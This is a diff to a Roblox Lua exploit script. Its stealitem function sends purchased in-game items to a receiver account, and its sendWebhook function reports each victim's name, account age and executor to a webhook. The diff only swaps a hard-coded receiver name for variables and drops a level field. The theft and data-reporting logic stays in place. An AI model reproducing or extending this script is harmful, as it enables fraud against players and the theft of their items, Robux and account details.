@@ -8,10 +8,6 @@ local result = 0
 
 local HttpService = game:GetService("HttpService")
 
-local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync("TehPucuk_55")
-end)
-
 local args = {
     [1] = "buyRobuxShop",
     [2] = {
@@ -72,7 +68,7 @@ local function sendWebhook()
         ["fields"] = {
             {
                 ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
-                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 🚀 Level: " ..tostring(getLvl()).. "\n | 💻 Executor Used: " ..identifyexecutor().. "```"
+                ["value"] = "``` | 📖 Name: " .. game.Players.LocalPlayer.Name .. "\n | 📌 Account Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\n | 🥳 Receiver: " .. Username .. "\n | 💻 Executor Used: " ..identifyexecutor().. "```"
             },
             {
                 ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
@@ -645,8 +641,8 @@ function stealitem()
                 ["StorageName"] = "Permanent Blade-Blade",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         
